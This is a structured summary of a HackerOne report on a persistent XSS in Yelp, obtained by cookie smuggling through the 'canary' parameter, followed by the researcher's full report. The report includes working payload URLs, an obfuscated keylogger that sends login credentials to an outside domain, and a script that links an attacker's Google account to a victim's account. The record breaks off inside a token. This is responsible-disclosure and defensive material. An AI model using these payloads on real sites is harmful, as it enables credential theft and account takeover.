# Yelp.com Persistent XSS via Cookie Smuggling Leading to Account Takeover

## Metadata
- **Source:** HackerOne
- **Report:** 2010530 | https://hackerone.com/reports/2010530
- **Submitted:** 2023-06-02
- **Reporter:** lil_endian
- **Program:** Yelp
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Cross-Site Scripting (XSS) - Stored/Persistent, Cookie Parsing Vulnerability, Cookie Smuggling, Improper Input Validation, Insufficient Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
Yelp reflects the unescaped 'guvo' cookie in HTML on multiple pages including login. By combining this with a cookie parsing bug that splits on spaces instead of semicolons, attackers can smuggle an XSS payload into the guvo cookie via a URL parameter, achieving persistent XSS across the domain. This enables credential theft via keyloggers or account takeover by linking attacker-controlled Google accounts.

## Attack scenario
1. Attacker crafts a malicious URL containing a canary parameter with embedded JavaScript payload and guvo cookie smuggling syntax (e.g., ?canary=asdf%20guvo%3D%3Cscript%3E...)
2. Attacker tricks victim into clicking the link or sends it via phishing/social engineering
3. Backend's broken cookie parser splits on spaces instead of semicolons, creating both yelpmainpaastacanary and guvo cookies with the payload
4. Backend sets Set-Cookie header with Max-Age=99999999, persisting the XSS payload indefinitely in victim's browser
5. When victim visits www.yelp.com or biz.yelp.com/login, the unescaped guvo cookie value executes in window.ySitRepParams or window.yelp.guv
6. Injected keylogger captures credentials as victim types email/password, or JavaScript links attacker's Google account to victim's Yelp account, enabling account takeover

## Root cause
Multiple chained vulnerabilities: (1) Insufficient output encoding of the guvo cookie value in HTML context, (2) Improper cookie parsing using space delimiter instead of RFC-compliant semicolon parsing, (3) Lack of validation on the canary parameter allowing injection of arbitrary cookie attributes including Max-Age for persistence

## Attacker mindset
An attacker seeks to gain persistent, authenticated access to Yelp business accounts to conduct account takeover, credential theft, or account hijacking. By chaining multiple seemingly minor bugs (XSS reflection + cookie parsing + cookie setting mechanism), the attacker achieves a reliable, long-lived attack vector that survives browser restarts. The use of base64 encoding and obfuscation tools (CyberChef) demonstrates premeditated exploitation and operational security awareness.

## Defensive takeaways
- Always HTML-encode/escape all user-controlled data before rendering in HTML context, regardless of source (cookies, parameters, headers)
- Implement strict cookie parsing per RFC 6265 - split on semicolons only, not spaces
- Validate and sanitize URL query parameters before using them in Set-Cookie headers; implement allowlist of acceptable cookie values
- Apply HttpOnly flag to sensitive cookies and Secure flag to all cookies to limit XSS impact
- Implement strict SameSite cookie policy (SameSite=Strict preferred) to prevent cross-site cookie injection
- Use Content Security Policy (CSP) with script-src restrictions to prevent inline script execution
- Implement cookie integrity verification (signed/HMAC) to detect tampering
- Conduct security code review of all cookie handling and output encoding logic
- Add WAF rules to detect suspicious cookie patterns and injection attempts

## Variant hunting
Test other cookies for similar unescaped reflections in HTML/JavaScript context across all Yelp subdomains
Check if other URL parameters besides 'canary' can inject Set-Cookie headers
Examine if cookie parsing issues affect other sensitive cookies (session tokens, authentication)
Test if space-based cookie parsing affects other header-based attacks (e.g., header injection)
Verify if similar vulnerabilities exist on other Yelp properties or parent company services
Attempt to inject other cookie attributes (Expires, Domain, Path) to extend attack scope
Test if CSP headers are present and can be bypassed via similar injection techniques

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1598 - Phishing for Information
- T1566 - Phishing
- T1056.004 - Keylogging
- T1539 - Steal Web Session Cookie
- T1185 - Man in the Browser
- T1528 - Steal Application Access Token
- T0817 - Social Engineering

## Notes
This is a sophisticated attack chain combining three distinct vulnerabilities into a high-impact exploit. The persistence mechanism (Max-Age cookie attribute injection) is particularly dangerous as it survives browser restarts. The proof-of-concept demonstrates real business impact (credential theft and account takeover) beyond simple XSS popup. The use of base64 encoding and external tool recipes indicates this was a well-researched, professional-grade vulnerability discovery. The attacker's choice to target the business login page (biz.yelp.com/login) suggests targeted attacks against business account holders rather than individual users, potentially higher value targets.

## Full report
<details><summary>Expand</summary>

# Summary:
yelp.com reflects the content of the cookie `guvo` in the html returned to the user. In some cases this value is not properly escaped, leading to XSS. This can be combined with another issue where the backend does not properly parse the user supplied cookies and allows us to smuggle a `guvo` cookie inside a cookie named `yelpmainpaastacanary`. The `yelpmainpaastacanary` cookie can be set by including a URL query parameter `?canary=[Cookie value]`  in any request to `*.yelp.com`.

This report shows how chaining this cookie XSS with a cookie parsing issue leads to persistent XSS in a victims browser. To demonstrate impact I'll show how this can be used to inject a keylogger on `https://biz.yelp.com/login` to steal email/password of a business account, as well as how it's possible to link an attackers Google account to a victims Yelp account, and gain access to the victims account via "Sign in with Google".

# Description
## XSS via "guvo" cookie
The value of the cookie `guvo` is reflected (unescaped) on some pages. Most interestingly on the frontpage of `www.yelp.com` and on the login page of `https://biz.yelp.com/login`. The unescaped reflection happens in the `window.ySitRepParams` object and the `window.yelp.guv` property. This can be seen by simply adding the cookie to the request in a browser or Burp, and observe the response:
██████████
█████████

## Setting the "yelpmainpaastacanary" cookie
There is a feature on `yelp.com` where by adding the query parameter `?canary=asdf` to a request, the response will contain an HTTP header:
```
Set-Cookie: yelpmainpaastacanary=asdf; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```
This gives us a way to set the cookie `yelpmainpaastacanary` to any value we want. But we need a way to control the `guvo` cookie. It turns out that we can smuggle the `guvo` cookie inside the `yelpmainpaastacanary` cookie.

## Broken cookie parsing and cookie smuggeling
The Yelp backend will parse the users cookies by splitting them by spaces instead of semicolons. Normally cookies sent by the browser will be separated by semicolons like
```
Cookie: a=1; b=2;
```
which should be parsed as 2 cookies `a` and `b`. But if we set a cookie like:
```
Cookie: a=1 b=2;
```
This should be parsed as 1 cookie `a` with the value "`1 b=2`", but Yelp will parse it as 2 cookies `a` and `b`. We can abuse this to smuggle the `guvo` cookie inside the `yelpmainpaastacanary` cookie by making a request to 
```
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
```
████

which sets the cookie
```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Domain=.yelp.com; Path=/; Secure; 
```
and results in our XSS payload triggering every time we visit the front page of `www.yelp.com`:
{F2394020}

As an added bonus we can also inject a `Max-Age: 99999999` attribute so our cookie doesn't expire and will just live in the victims browser and wait for our XSS injection to happen:
```
https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999
```
```
Set-Cookie: yelpmainpaastacanary=asdf guvo=</script><script>alert(1)</script>; Max-Age=99999999; Domain=.yelp.com; Path=/; Secure; SameSite=Lax
```

# POCs
_Please note: Since I'm in Denmark yelp.com will redirect to yelp.dk. The attacks work exactly the same on both domains._

## Keylogger on biz.yelp.com/login
This javascript snippet will leak the content of the email and password fields on `https://biz.yelp.com/login` when the user types, or when the login form is submitted. The credentials are leaked to the domain `calc.sh` which I own:
```javascript
setTimeout(function () {
  a = document.getElementsByName('password')[0];
  b = document.getElementsByName('email')[0];
  function f() {
    fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
  }
  a.form.onclick=f;
  a.onchange=f;
  b.onchange=f;
  a.oninput=f;
  b.oninput=f;
}, 1000)
```

We create a link that will set the guvo cookie to fire this payload on the login page. See this CyberChef recipe for how it's done and to easily make modifications:
```
https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=c2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgYSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCdwYXNzd29yZCcpWzBdOwogIGIgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnZW1haWwnKVswXTsKICBmdW5jdGlvbiBmKCkgewogICAgZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8/YT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKTsKICB9CiAgYS5mb3JtLm9uY2xpY2s9ZjsKICBhLm9uY2hhbmdlPWY7CiAgYi5vbmNoYW5nZT1mOwogIGEub25pbnB1dD1mOwogIGIub25pbnB1dD1mOwp9LCAxMDAwKQ
```
Our final link looks like this:
```
https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999
```

Anyone visiting that link will have our keylogger installed. Here's a short video showing it in action:
███

## Account takeover by linking a Google account
The request to link a Google account to a Yelp account is done from `https://yelp.com/profile_sharing`. The final request in the Google-link-flow is a POST request to `https://www.yelp.dk/google_connect/register` with CSRF token `csrftok` and a token `id_token` which is the token liking a Google account to the Yelp account. We can generate a token for our own Google account, and then use the XSS to link it to a victims account.

To generate a token we simply link a Google account to our own Yelp account and intercept the final request in Burp:
████████

Now that we have a token for the Google accoutn `██████` we can create an XSS payload for a victim. In this code we make a request to `/profile_sharing` and extract the csrf token with a reqular expression. We then make the request to link our Google account to the victims account using the `id_token` we prepared:
```javascript
(function f() {
  a = new XMLHttpRequest();
  a.addEventListener('load', function () {
    rx = /"GoogleConnect": "([^"]*)/;
    id_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTt

</details>

---
*Analysed by Claude on 2026-05-11*
